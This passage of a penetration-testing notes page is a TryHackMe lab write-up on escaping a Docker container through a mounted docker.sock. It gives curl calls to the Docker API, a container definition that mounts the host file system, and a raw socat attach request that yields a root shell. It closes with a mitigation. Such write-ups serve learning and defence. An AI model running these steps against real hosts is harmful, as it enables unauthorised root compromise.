+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_14_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_14">
+<span class="md-nav__icon md-icon"></span>
+            Shells
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../shells/C2-Frameworks/">
+<span class="md-ellipsis">
+    C2-Frameworks
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../shells/index-of-shells/">
+<span class="md-ellipsis">
+    Index of shells
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../shells/link_dump/">
+<span class="md-ellipsis">
+    shell resources
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../shells/shell_upgrades/">
+<span class="md-ellipsis">
+    shell_upgrades
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../shells/shells-home/">
+<span class="md-ellipsis">
+    general methodology for sending shells
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../shells/webshells/">
+<span class="md-ellipsis">
+    php webshells
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../shells/windows_shells/">
+<span class="md-ellipsis">
+    windows_shells
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_15" type="checkbox"/>
+<label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="0">
+<span class="md-ellipsis">
+    Web
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_15_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_15">
+<span class="md-nav__icon md-icon"></span>
+            Web
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../web/index-of-web/">
+<span class="md-ellipsis">
+    Index of web
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_15_2" type="checkbox"/>
+<label class="md-nav__link" for="__nav_15_2" id="__nav_15_2_label" tabindex="0">
+<span class="md-ellipsis">
+    Weaponizing common vulnerabilities
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_15_2_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_15_2">
+<span class="md-nav__icon md-icon"></span>
+            Weaponizing common vulnerabilities
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../web/weaponizing-common-vulnerabilities/LFI-and-SMTP-gives-RCE/">
+<span class="md-ellipsis">
+    LFI-and-SMTP-gives-RCE
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../web/weaponizing-common-vulnerabilities/index-of-weaponizing-common-vulnerabilities/">
+<span class="md-ellipsis">
+    Index of weaponizing common vulnerabilities
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../web/weaponizing-common-vulnerabilities/purpose-of-weaponizing-common-vulnerabilities/">
+<span class="md-ellipsis">
+    purpose-of-weaponizing-common-vulnerabilities
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_15_3" type="checkbox"/>
+<label class="md-nav__link" for="__nav_15_3" id="__nav_15_3_label" tabindex="0">
+<span class="md-ellipsis">
+    Web enumeration
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_15_3_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_15_3">
+<span class="md-nav__icon md-icon"></span>
+            Web enumeration
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../web/web_enumeration/creative_enumeration/">
+<span class="md-ellipsis">
+    creative enumeration methods
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../web/web_enumeration/domain_enumeration/">
+<span class="md-ellipsis">
+    domain_enumeration
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../web/web_enumeration/general_methodology/">
+<span class="md-ellipsis">
+    general_methodology
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../web/web_enumeration/index-of-web_enumeration/">
+<span class="md-ellipsis">
+    Index of web enumeration
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../web/web_enumeration/opensource_targets/">
+<span class="md-ellipsis">
+    opensource_targets
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../web/web_enumeration/php_flavor_site/">
+<span class="md-ellipsis">
+    php_flavor_site
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_16" type="checkbox"/>
+<label class="md-nav__link" for="__nav_16" id="__nav_16_label" tabindex="0">
+<span class="md-ellipsis">
+    Windows
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_16_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_16">
+<span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../windows/index-of-windows/">
+<span class="md-ellipsis">
+    Index of windows
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../windows/win_enumeration/">
+<span class="md-ellipsis">
+    win_enumeration
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../windows/win_facts/">
+<span class="md-ellipsis">
+    win_facts
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../windows/win_killchain/">
+<span class="md-ellipsis">
+    win_killchain
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../windows/win_toolset/">
+<span class="md-ellipsis">
+    win_toolset
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_16_6" type="checkbox"/>
+<label class="md-nav__link" for="__nav_16_6" id="__nav_16_6_label" tabindex="0">
+<span class="md-ellipsis">
+    Active directory
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_16_6_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_16_6">
+<span class="md-nav__icon md-icon"></span>
+            Active directory
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../windows/active-directory/active-directory-fundamentals/">
+<span class="md-ellipsis">
+    active-directory-fundamentals
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../windows/active-directory/if_then_enumerations/">
+<span class="md-ellipsis">
+    if_then_enumerations
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../windows/active-directory/index-of-active-directory/">
+<span class="md-ellipsis">
+    Index of active directory
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../windows/active-directory/kerberoasting-and-other-hash-attacks/">
+<span class="md-ellipsis">
+    kerberoasting-and-other-hash-attacks
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../windows/active-directory/ldap/">
+<span class="md-ellipsis">
+    ldap
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_16_7" type="checkbox"/>
+<label class="md-nav__link" for="__nav_16_7" id="__nav_16_7_label" tabindex="0">
+<span class="md-ellipsis">
+    Win post exploitation
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_16_7_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_16_7">
+<span class="md-nav__icon md-icon"></span>
+            Win post exploitation
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../windows/win_post_exploitation/Introduction/">
+<span class="md-ellipsis">
+    Post Exploitation
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#briefing">
+    briefing
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#procedure">
+    procedure
+  </a>
+<nav aria-label="procedure" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#preparations">
+    preparations
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#start-our-malicious-container">
+    start our malicious container
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#request-shell-from-docker-socket">
+    request shell from docker socket
+  </a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#conclusion">
+    conclusion
+  </a>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-content" data-md-component="content">
+<article class="md-content__inner md-typeset">
+<h1 id="via-docker-socket">via-docker-socket<a class="headerlink" href="#via-docker-socket" title="Permanent link">¶</a></h1>
+<h2 id="briefing">briefing<a class="headerlink" href="#briefing" title="Permanent link">¶</a></h2>
+<p>Encountered a docker container which had the <code>docker.sock</code> included in the mounted volumes. This allowed for escape of the counter by interacting with the socket via <code>curl</code> requests. </p>
+<ul>
+<li>lab environment:<ul>
+<li><a href="https://tryhackme.com/room/linuxagency">https://tryhackme.com/room/linuxagency</a></li>
+</ul>
+</li>
+<li>Procedure was created by studying this blog:<ul>
+<li><a href="https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html">https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="procedure">procedure<a class="headerlink" href="#procedure" title="Permanent link">¶</a></h2>
+<blockquote>
+<p>throughout this section, edit the <code>~/path/to/docker.sock</code> as needed.</p>
+</blockquote>
+<h3 id="preparations">preparations<a class="headerlink" href="#preparations" title="Permanent link">¶</a></h3>
+<p>We need two things prepared:</p>
+<ol>
+<li>we should escalate to the root user within the container we are trapped in</li>
+<li>we need to serve a statically linked copy of <code>socat</code> to our target</li>
+<li>we need to know what docker images are available on the target in order to prepapre the <code>containers.json</code> file. If the target has internet access, alpine is a nice image to pull down due to its small size</li>
+</ol>
+<p>If our user does not have access to the docker binary to run <code>docker images</code>, we may still have permission to interact with the docker api directly via <code>curl</code>. </p>
+<p>The following lists available images. </p>
+<pre><code class="language-bash">curl -XGET --unix-socket /var/run/docker.sock http://localhost/containers/json
+</code></pre>
+<p>Pick an available image, in our case <code>mangoman</code>, and prepare the <code>container.json</code> file.</p>
+<pre><code class="language-bash">echo -e '{"Image":"mangoman","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/etc/","Target":"/host_etc"}]}' &gt; container.json
+</code></pre>
+<p>Take note of the mounts in the above command, these can be modified to include the root file system. e.g. <code>"Source":"/", "Target":"/pwned"</code>. With access to the root file system of the host, arbitrary read/write is possible, therefore full compromise is achieved.</p>
+<h3 id="start-our-malicious-container">start our malicious container<a class="headerlink" href="#start-our-malicious-container" title="Permanent link">¶</a></h3>
+<p>We can create a container based off of our <code>container.json</code> with:</p>
+<pre><code class="language-bash">curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d "$(cat container.json)" http://localhost/containers/create
+</code></pre>
+<p>The above command yields a response on <code>stdout</code> from the docker daemon. The response has the <strong>four digit hex docker id</strong> of the container we created. This id is needed for the remaining steps.</p>
+<p>At this point, the container is <strong>not running yet</strong>. We can start it using the docker id by:</p>
+<pre><code class="language-bash">curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/4_DIGIT_DOCKER_ID_FROM_ABOVE/start
+</code></pre>
+<p>Note that the above command produces <strong>no output on the terminal</strong>.</p>
+<h3 id="request-shell-from-docker-socket">request shell from docker socket<a class="headerlink" href="#request-shell-from-docker-socket" title="Permanent link">¶</a></h3>
+<p>With our container running, we can now request a shell via the docker api by interacting with the <code>docker.sock</code> using <code>socat</code>. Any tool that allows manual crafting of HTTP headers will work, <code>socat</code> is used for reliability.</p>
+<p>Open a connection using <code>socat</code>: </p>
+<pre><code class="language-bash">./socat - UNIX-CONNECT:/var/run/docker.sock
+</code></pre>
+<p>Now we can modify HTTP header manually. I recommend preparing the following payload, then copy pasting it into the terminal.</p>
+<pre><code class="language-bash">POST /containers/4_DIGIT_DOCKER_ID_FROM_ABOVE/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1 HTTP/1.1
+Host:
+Connection: Upgrade
+Upgrade: tcp
+
+
+</code></pre>
+<p>Note the following</p>
+<ul>
+<li>the two line breaks in the above are necessary to make the HTTP request valid</li>
+<li>the <code>4_DIGIT_DOCKER_ID_FROM_ABOVE</code> must be replaced </li>
+</ul>
+<p>Returns a root shell to us! We are root user of our custom container. Our custom container has the host file system mounted on it. Thus, we have full control of the host.</p>
+<h2 id="conclusion">conclusion<a class="headerlink" href="#conclusion" title="Permanent link">¶</a></h2>
+<p>The procedure detailed here is not an exhaustive description of what is possible from this misconfiguration. In general, if it can be done through the docker API then it can be done through similar methods as detailed above. This makes sense, as the <code>docker.sock</code> is pointed at localhost, which is within the "walled garden" and not subject to robust security standards. This escape vector can be eliminated by ensuring that the <code>docker.sock</code> is never accidentally mounted when containers are deployed. A redundancy measure could be implemented that uses the <code>find</code> command in all perspective mounts and halts container deployment in the event of <code>docker.sock</code> being present.</p>
+</article>
+</div>
+</div>
+</main>
+<footer class="md-footer">
+<div class="md-footer-meta md-typeset">
+<div class="md-footer-meta__inner md-grid">
+<div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
+      Material for MkDocs
+    </a>
+</div>
+</div>
+</div>
+</footer>
+</div>
+<div class="md-dialog" data-md-component="dialog">
+<div class="md-dialog__inner md-typeset"></div>
+</div>
+<script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy"], "search": "../../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+<script src="../../../assets/javascripts/bundle.81fa17fe.min.js"></script>
+<script src="../../../javascripts/mathjax.js"></script>
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</body>
+</html>
